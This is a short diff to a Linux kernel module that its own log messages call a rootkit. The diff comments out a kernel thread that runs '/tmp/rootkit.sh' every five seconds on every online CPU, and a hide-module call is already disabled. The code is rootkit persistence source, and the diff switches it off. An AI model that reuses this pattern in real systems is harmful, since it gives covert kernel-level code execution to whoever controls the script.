@@ -52,15 +52,15 @@ static int exec_cmd(char *script){
 }
 
 
-static int threadfn(void *data){
-	do {
-		exec_cmd("/tmp/rootkit.sh\0");
-		msleep(5000);
-	} while(!kthread_should_stop());
+// static int threadfn(void *data){
+// 	do {
+// 		exec_cmd("/tmp/rootkit.sh\0");
+// 		msleep(5000);
+// 	} while(!kthread_should_stop());
 
-	pr_info("ROOTKIT kernel thread stopping\n");
-	return 0;
-}
+// 	pr_info("ROOTKIT kernel thread stopping\n");
+// 	return 0;
+// }
 
 static int __init my_init(void)
 {
@@ -101,13 +101,13 @@ static int __init my_init(void)
 
 	//module_hide();
 	
-	for_each_online_cpu(cpu) {
-		// create, bind, wake
-		pr_info("ROOTKIT Starting kernel thread on cpu %d\n", cpu);
-		my_kthread = kthread_create(threadfn, &cpu, "rootkit");
-		kthread_bind(my_kthread, cpu);
-		wake_up_process(my_kthread);	
-	}
+	// for_each_online_cpu(cpu) {
+	// 	// create, bind, wake
+	// 	pr_info("ROOTKIT Starting kernel thread on cpu %d\n", cpu);
+	// 	my_kthread = kthread_create(threadfn, &cpu, "rootkit");
+	// 	kthread_bind(my_kthread, cpu);
+	// 	wake_up_process(my_kthread);	
+	// }
 	
 	return 0;
 }
